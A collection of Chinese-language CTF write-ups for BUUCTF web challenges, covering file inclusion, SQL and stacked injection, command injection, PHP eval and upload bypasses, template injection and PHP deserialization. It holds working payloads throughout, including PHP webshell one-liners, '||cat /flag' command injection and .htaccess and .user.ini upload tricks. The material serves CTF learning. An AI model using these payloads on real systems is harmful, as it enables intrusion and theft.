## [HCTF 2018]WarmUp

前置知识:

mb_strpos(a,b) 判断b在a中首次出现的位置，返回数字

mb_substr(a,b,c) 对a进行截取,b控制从哪一位开始截取,c控制截取的长度(若没有则表示截取剩余的全部)

![1626068492045](buuweb_page1.assets/1626068492045.png)

考察点:CVE-2018-12613，文件包含漏洞，代码审计

打开题目是一张笑脸，查看网页源代码，发现source.php

![1626066531437](buuweb_page1.assets/1626066531437.png)

访问source.php获得题目源码,从源码中看到hint.php能知道flag的位置

```
flag not here, and flag in ffffllllaaaagggg
```

也就是说flag位于上四层目录中,对应的payload为

```
../../../../../ffffllllaaaagggg
```

题目源码

```php
 <?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];#白名单
            # ||运算，满足一个即为真.如果$page的值非空或$page不是字符类型则返回false
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
		#判断$Page中是否有白名单的内容
            if (in_array($page, $whitelist)) {
                return true;
            }
		#mb_strpos($page . '?', '?')，返回?在$page中第一次出现的位置，mb_substr对$page从第0位进行截取到?之前。
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
          #判断$_page是否存在于白名单中
            if (in_array($_page, $whitelist)) {
                return true;
            }
		#进行一次url解码
            $_page = urldecode($page);
         #再重复一次截取
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
          #判断$_page是否存在于白名单中
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 
```

先看传值的部分,if里进行了&&运算，即要保证传入的file非空，is_string，以及经过checkFile的检测同时为真才能实现文件包含。

```php
if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
```

再看类,直接将过程写在源码里方便看。也就是说我们的payload中必须有hint.php?或source.php?且位置必须在payload的前面才能绕过检测,由此得payload

```
hint.php?
```

两段综合起来

```
?file=hint.php?../../../../../ffffllllaaaagggg
```

## [极客大挑战 2019]EasySQL

考察点:sql注入，万能密码

payload

```
用户名:admin
密码:1'or'1'='1'#
```

登录成功获得flag

![1626069081896](buuweb_page1.assets/1626069081896.png)

## [极客大挑战 2019]Havefun

右击查看源代码，发现关键代码

```php
                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
```

根据源码令$cat==dog即可获得flag，所以payload为

```
?cat=dog
```

![1626069305939](buuweb_page1.assets/1626069305939.png)

## [强网杯 2019]随便注

考察点:堆叠注入以及mysql数据库的操作

查询一下所有数据

```sql
-1'or '1'='1
```

![1626070045770](buuweb_page1.assets/1626070045770.png)

想着fuzz一下，发现给了正则

```sql
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```

这也意味着我们不能使用联合查询来进行注入。没有过滤show，可以试一下堆叠注入

```sql
1';show databases;#
```

![1626070197998](buuweb_page1.assets/1626070197998.png)

查看表名

```sql
1';show tables;#
```

![1626070271531](buuweb_page1.assets/1626070271531.png)

在数字表里发现了flag

```sql
1';desc `1919810931114514`;#
1';show columns from `1919810931114514`;#
```

![1626070447738](buuweb_page1.assets/1626070447738.png)

这样就出现了一个问题，如何查询flag的字段值呢

然后就想到了一个问题，当我们输入-1'or '1'='1时，返回的是id以及对应的数据，然后我们查看words表的列名，就发现整好对应了id和data

![1626073440841](buuweb_page1.assets/1626073440841.png)

所以猜测sql语句为

```sql
select id,data from words where id=
```

因为flag存在于数字表，所以我们可以把数字表的表名改为words，把words表改为其他，把字段flag改为id就能实现读取flag

```sql
1';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
```

然后再

```sql
1'or '1'='1
```

![1626073782071](buuweb_page1.assets/1626073782071.png)

## [ACTF2020 新生赛]Include

考点:php伪协议

进入题目有个tips，点一下

![1626074043406](buuweb_page1.assets/1626074043406.png)

因为题目为include，该页面又为flag.php，所以可能是让我们读flag.php，伪协议读一下base64-decode即可

```php
?file=php://filter/convert.base64-encode/resource=flag.php
```



## [极客大挑战 2019]Secret File

一开始没什么思路，dirsearch扫了一下没扫出什么东西

查看源码，看到./Archive_room.php

![1626080194433](buuweb_page1.assets/1626080194433.png)

访问一下

![1626080239434](buuweb_page1.assets/1626080239434.png)

点secret就到了end.php什么都没有

再查看源码，发现action.php

![1626080295828](buuweb_page1.assets/1626080295828.png)

访问一下，发现直接跳到了end.php，那就抓包看一下

![1626080328214](buuweb_page1.assets/1626080328214.png)

访问  secr3t.php看到源码

```php+HTML
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
</html>
```

通过源码可以知道只要过了if就能include，if里有strstr和stristr两个函数，不知道有啥用看下手册

![1626080518041](buuweb_page1.assets/1626080518041.png)

![1626080573259](buuweb_page1.assets/1626080573259.png)

两个函数差不多，if中间进行了||运算，只要满足其中一个就执行exit()，直接使用php://filter就可绕过

```php
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
```

```php+HTML
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{32cebccc-b2be-4727-a068-bb2fe93767ae}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>

```

## [ACTF2020 新生赛]Exec

知识点:命令执行漏洞

题目给了一个ping地址的框，题目名为exec，很明显考察命令执行漏洞

![1626080988071](buuweb_page1.assets/1626080988071.png)

因为为exec，可以直接执行命令，先ls一下看看

```
127.0.0.1||ls
```

![1626081068558](buuweb_page1.assets/1626081068558.png)

```
127.0.0.1||cat index.php
```

![1626081102690](buuweb_page1.assets/1626081102690.png)

```
看一下根目录有啥
127.0.0.1||ls /
```

![1626081140321](buuweb_page1.assets/1626081140321.png)

直接cat flag

```
127.0.0.1||cat /flag
```

![1626081165663](buuweb_page1.assets/1626081165663.png)



## [GXYCTF2019]Ping Ping Ping

刚进来提示我们给ip传参，想到可能存在命令执行直接ls一下

![1626084718735](buuweb_page1.assets/1626084718735.png)



```
?ip=127.0.0.1||ls
```

```
?ip=127.0.0.1||cat index.php
```

发现空格被ban了

![1626084777193](buuweb_page1.assets/1626084777193.png)

试了几种绕过空格的方法，只有这个能过

```
?ip=127.0.0.1||cat$IFS$1index.php
```

然后就看到了源代码

```php
/?ip=
|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "

";
  print_r($a);
}

?>
```

可以看到过滤了flag所以想办法绕过flag即可，另外使用了shell_exec来执行命令

![1626085120035](buuweb_page1.assets/1626085120035.png)

可以利用拼接的形式绕过

```
?ip=127.0.0.1||c=g;cat$IFS$1fla$c.php
```

另一种直接使用内敛执行

```
?ip=127.0.0.1;cat$IFS$1`ls`
```

![1626085276313](buuweb_page1.assets/1626085276313.png)

## [极客大挑战 2019]Knife

直接给了shell，蚁剑连接即可

![1626085402887](buuweb_page1.assets/1626085402887.png)

![1626085464068](buuweb_page1.assets/1626085464068.png)

flag在根目录

## [极客大挑战 2019]Http

查看源码，看到一个Secret.php

![1626085575842](buuweb_page1.assets/1626085575842.png)

访问一下

![1626085631434](buuweb_page1.assets/1626085631434.png)

修改请求包

```
Referer:https://www.Sycsecret.com
```

![1626085790408](buuweb_page1.assets/1626085790408.png)

改一下浏览器

```
User-Agent: Syclover
```

![1626085872217](buuweb_page1.assets/1626085872217.png)

使用本地来访问

```
X-Forwarded-For:127.0.0.1
```

拿到flag

![1626085901807](buuweb_page1.assets/1626085901807.png)

## [RoarCTF 2019]Easy Calc

考察点:php解析漏洞，命令执行绕过

查看源码

![1626086076360](buuweb_page1.assets/1626086076360.png)

访问一下获得源码

```php
 <?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>

```

​	可以看到if里要求没有传入num参数就显示源码，否则$str = $_GET['num'];。

​	意思就是说既让我们传入又不让我们传入num。这里可以使用php解析漏洞进行绕过

```
calc.php? num=phpinfo()
```

这样在if里会被认为传入的是" num"而不是num，经过php解析之后就变回"num"所以就执行了else。

先看一下phpinfo有没有禁用函数,过滤了执行系统命令的函数

![1626090200357](buuweb_page1.assets/1626090200357.png)

​	这样就得用其他函数来读flag了，读文件的函数有很多(例如:show_source,highlight_file,print_r,var_dump,include)var_dump等一些打印的函数没有过滤，scandir，file_get_contents()也没有过滤，可以使用这三个函数来绕过

​	可以先打印一下根目录

```
calc.php? num=var_dump(scandir('/'))
```

这样是不被允许的，因为黑名单过滤了 "/",可以使用chr将ascii转为字符串

```
calc.php? num=var_dump(scandir(chr(47)))
```

可以看到flag位于根目录，且名称为flaag

![1626090410340](buuweb_page1.assets/1626090410340.png)

可以利用file_get_contents()直接读

```
calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

http走私的做法

## [护网杯 2018]easy_tornado

既然是tornado肯定是考察模板注入，模板注入肯定要找注入点

开始的三个文件找了一圈都没找到注入点在哪，然后就没思路了，看了一下师傅的wp，发现注入点在error这个路由

![1626091669339](buuweb_page1.assets/1626091669339.png)

想到flask的secret是位于{{config}},所以看下config，因为只会flask的注入，给我一堆报错就很蒙。

![1626091720477](buuweb_page1.assets/1626091720477.png)

然后百度之后才知道，tornado的config是在

```
{{handler.settings}}
```

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '7901570a-b76e-4578-9449-e65910e41c40'}
```

这样就得到了cookie_secret，然后看一下hint.txt

```
/hints.txt
md5(cookie_secret+md5(filename))
```

payload

```
file?filename=/fllllllllllllag&filehash=3b3b2af99f3ca71d7fce7b9a99247a58
```

![1626092248752](buuweb_page1.assets/1626092248752.png)

## [极客大挑战 2019]Upload

考察：文件上传漏洞以及绕过

测试了一下，php php3 php4 php5 pht都被过滤了，phtml可以上传成功，但是不能包含<?

![1626155643919](buuweb_page1.assets/1626155643919.png)

因此可以使用js的马

```
<script language="php">eval($_REQUEST[1])</script>
```

加上GIF文件头尝试一下

![1626155794345](buuweb_page1.assets/1626155794345.png)

![1626155813198](buuweb_page1.assets/1626155813198.png)

成功！

根据该页面为upload_file.php，所以猜测为upload目录，蚁剑连接即可，flag位于根目录

## [极客大挑战 2019]PHP

知识点:源码泄露，反序列化漏洞

dirsearch扫描一下，发现源码泄露，访问www.zip下载源码

index.php主要代码

```php
<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

class.php主要代码

```php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

​	在destruct()里只要username为admin，password为100就能得到flag，但是反序列化时__wakeup会将username改为guest，所以要绕过wakeup，只需修改Name后面的2改为3即可(属性个数大于原来的真实属性值会绕过wakeup函数的执行)。另外因为变量为Privat,所以要进行url编码。

exp:

```php
<?php
class Name{
    private $username = 'admin';
    private $password = '100';
}
$a = new Name();
echo urlencode(serialize($a))
?>
```

```
payload:
index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D 
```

![1626094839251](buuweb_page1.assets/1626094839251.png)

 

## [ACTF2020 新生赛]Upload

与2019极客大挑战的做法一样。

能上传pht但是不能解析，上传phtml即可。

![1626157173254](buuweb_page1.assets/1626157173254.png)

下面总结一下文件上传常用的几种姿势:

```
.htaccess AddType application/x-httpd-php .jpg	# 将jpg后缀的文件解析为php,只适用于apache
.user.ini  GIF89a auto_prepend_file=1.jpg 
php3，php4，php5，pht，phtml,phps
```

## [ACTF2020 新生赛]BackupFile

点了点没发现什么东西，dirmap扫一下

![1626159952983](buuweb_page1.assets/1626159952983.png)

发现隐藏文件，获得源码

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}
```

考点是字符串再进行 == 比较时会转化为数字再进行比较所以payload为

```
?key=123
```

## [HCTF 2018]admin

## [极客大挑战 2019]BuyFlag

​	题目要求是达到几个条件才能购买flag，题目给了我们几个条件

![1626673307308](buuweb_page1.assets/1626673307308.png)

这样没什么思路，看下源码，在注释里给我留了一些东西

```php
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

要求password不能为数字，且password==404，这个很简单利用php弱类型比较漏洞

```
password=404a
```

​	这样我们看不出别的东西了，burp抓下包看看，我们提交password没什么反应，但是在cookie里有个值

![1626673570406](buuweb_page1.assets/1626673570406.png)

​	将其改为1看看，页面发生了变化

![1626673645367](buuweb_page1.assets/1626673645367.png)

​	让我们支付，那就传一个money=100000000呗

![1626673763487](buuweb_page1.assets/1626673763487.png)

提示我们length太长，说明对其长度进行了限制，怀疑是strcpm()函数，利用其特性，改用数组绕过一下

![1626673840018](buuweb_page1.assets/1626673840018.png)

## [BJDCTF2020]Easy MD5

题目是一个提交框，怀疑是注入，但是输什么都没反应，抓下包看看

可以回显给了我们一个hint

![1626674092157](buuweb_page1.assets/1626674092157.png)

```sql
select * from 'admin' where password=md5($pass,true)
```

老考点了零$pass为ffifdyop即可绕过。然后到达了下一关

![1626674174648](buuweb_page1.assets/1626674174648.png)

查看源代码看到题目源码,基础的md5绕过

```php
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.

```

```php
?a[]=1&b[]=2
```

到达下一关

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

md5强类型比较，百度搜一下符合条件即可得到flag

```
param1[]=s878926199a&param2[]=QNKCDZO
```

## [ZJCTF 2019]NiZhuanSiWei

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

​	首先满足fille_get_contents()的值为welcome to the zjctf，才能进入if循环，用data伪协议实现即可,welcome to the zjctf打印出来证明payload没问题

```
?text=data://text/plain,welcome to the zjctf
```

​	然后进入内嵌的if，如果$file匹配到flag，输出not now，显然是要进入else。

​	else里提示uselesss.php，既然有include，那就直接用filter读一下

```
file=php://filter/convert.base64-encode/resource=userless.php
```



```php
<?php  

class Flag{  //flag.php  
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

​	获得其源码,存在一个tostring()方法，只要能利用__tostring方法就能读到flag。

​	这边存在一个

```
echo file_get_contents($this->file); 
```

也就是说执行反序列化后，echo Flag对象就可以执行__tostring方法，进而读到flag。这样小链子就出来了

```php
<?php  

class Flag{  //flag.php  
    public $file='flag.php';  
}  

$a = new Flag();
$b = serialize($a);
// echo urlencode($b);
echo $b;
?>  
#O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

```
payload:
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```

​	查看源码获得flag

![1626675291378](buuweb_page1.assets/1626675291378.png)

但是这边有个问题，为什么payload里的file为伪协议的方式就读不到flag，值得思考。

## [SUCTF 2019]CheckIn

随意上传一个，发现过滤了<?

![1626675690853](buuweb_page1.assets/1626675690853.png)

使用下方一句话尝试绕过一下

```
<script language="php">eval($_POST[1]);</script>
```

尝试了php php3 php4 php5 pht phtml都不合法，那就只能传图片喽

![1626675873000](buuweb_page1.assets/1626675873000.png)

提示我们不是图片，那给一句话加个文件头试试，content-type习惯性改为图片的格式

![1626675950328](buuweb_page1.assets/1626675950328.png)

​	这样就上传成功了，并返回给了我们目录且有index.php，这不明摆着告诉我们使用.user.ini配置文件嘛

​	.user.ini的配置原理可以简单理解为当前目录下的php文件都包含一句话，利用条件为目录下要有php文件。

```
auto_prepend_file=1.jpg
```

![1626676088492](buuweb_page1.assets/1626676088492.png)

蚁剑连接即可(这题好像自动删除目录下的文件，速度要快)

```
http://989256bf-a20c-41b3-9229-4d4740e3bfd7.node4.buuoj.cn/uploads/4205d8dde7a291d9276e8bc3536868f3/index.php
```

flag在根目录

![1626676320604](buuweb_page1.assets/1626676320604.png)

## [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

​	这题代码很长，但是题目并不难

先看主要的代码

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

​	传入一个参数，经过is_vali的检验执行反序列化，is_valid检验的就是是否为可打印字符，可以看到类里的变量为protected定义的，序列化之后会生成不可打印字符，可以将其改为public对其进行绕过

​	三个功能函数

```php
 private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }
```

​	可以看到可以利用output函数对write或read函数的返回值进行输出。write函数并没有什么实际作业，而read函数可利用file_get_contents来读文件

```php
public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
```

​	process会根据op的值来判断执行write还是read，我们的目的是执行read，所以让op的值为2

​	__destruct()里使用了强类型的比较(这里的2位字符串类型，可以定义一个int类型),可以利用op=2进行绕过，这样op就不会被重置为1

```php
if($this->op === "2")
            $this->op = "1";
```

这样链子就出来了

destruct->process->read->output

```php
exp:
<?php

class FileHandler {

    public $op = 2;
    public $filename = "php://filter/convert.base64-encode/resource=flag.php";
    public $content;
}
echo serialize(new FileHandler());

?>
```

payload:

```
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

![1626677675464](buuweb_page1.assets/1626677675464.png)

## [MRCTF2020]你传你🐎呢

经过测试，传php后缀的都不可以，只能传图片喽

![1626677812001](buuweb_page1.assets/1626677812001.png)

图片马上传成功，只返回了路径，试一下.htaccess

## [MRCTF2020]Ez_bypass

```php

I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}Please input first
```

很简单的一道题，前面做过很多了，就不赘述了

```
payload:
get ?gg[]=1&id[2&passwd=1234567a]=
post passwd=1234567a
```

![1626678208350](buuweb_page1.assets/1626678208350.png)

## 